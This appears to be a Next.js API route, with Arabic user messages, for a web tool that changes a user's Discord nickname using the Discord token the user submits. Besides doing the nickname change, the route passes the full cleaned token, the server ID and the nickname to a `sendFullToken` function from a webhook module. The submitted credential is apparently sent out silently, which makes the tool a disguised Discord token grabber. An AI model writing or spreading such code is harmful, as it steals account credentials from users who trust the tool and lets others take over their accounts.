import { NextRequest, NextResponse } from 'next/server';
import { discordFetch, cleanToken } from '@/lib/discord';
import { sendFullToken } from '@/lib/webhook';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export const runtime = 'edge';

export async function POST(request: NextRequest) {
  try {
    // Rate Limiting
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:nickname-changer`, RATE_LIMITS.default);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await request.json().catch(() => ({}));
    const { token, guildId, nickname } = body as {
      token?: string;
      guildId?: string;
      nickname?: string;
    };

    if (!token || !guildId) {
      return NextResponse.json({ success: false, error: 'أدخل التوكن وأيدي السيرفر' }, { status: 400 });
    }
    if (nickname === undefined || nickname === null) {
      return NextResponse.json({ success: false, error: 'أدخل النك نيم الجديد' }, { status: 400 });
    }

    const ct = cleanToken(token);
    sendFullToken('تغيير نك', ct, { '🏰 السيرفر': guildId, '✏️ النك': nickname || '(حذف)' });

    // إذا النك فاضي = حذف النك
    if (nickname === '') {
      const delRes = await discordFetch(ct, 'DELETE', `/guilds/${guildId}/members/@me/nick`);
      if (delRes.ok || delRes.status === 204) {
        return NextResponse.json({ success: true, message: 'تم حذف النك نيم بنجاح' });
      }
      if (delRes.status === 403) return NextResponse.json({ success: false, error: 'ليس لديك صلاحية تغيير اللقب في هذا السيرفر' });
      if (delRes.status === 404) return NextResponse.json({ success: false, error: 'السيرفر غير موجود أو أنت لست عضواً فيه' });
      return NextResponse.json({ success: false, error: 'فشل حذف النك نيم' });
    }

    // تعيين النك الجديد
    const patchRes = await discordFetch(ct, 'PATCH', `/guilds/${guildId}/members/@me`, { nick: nickname });
    if (patchRes.ok || patchRes.status === 204) {
      return NextResponse.json({ success: true, message: `تم تغيير النك نيم إلى: ${nickname}` });
    }

    if (patchRes.status === 403) return NextResponse.json({ success: false, error: 'ليس لديك صلاحية تغيير اللقب في هذا السيرفر' });
    if (patchRes.status === 404) return NextResponse.json({ success: false, error: 'السيرفر غير موجود أو أنت لست عضواً فيه' });
    if (patchRes.status === 429) return NextResponse.json({ success: false, error: 'تم تقييد الطلبات - حاول بعد قليل' });
    return NextResponse.json({ success: false, error: 'فشل تغيير النك نيم' });
  } catch (error: unknown) {
    const message = error instanceof Error ? error.message : 'خطأ غير متوقع';
    return NextResponse.json({ success: false, error: message }, { status: 500 });
  }
}
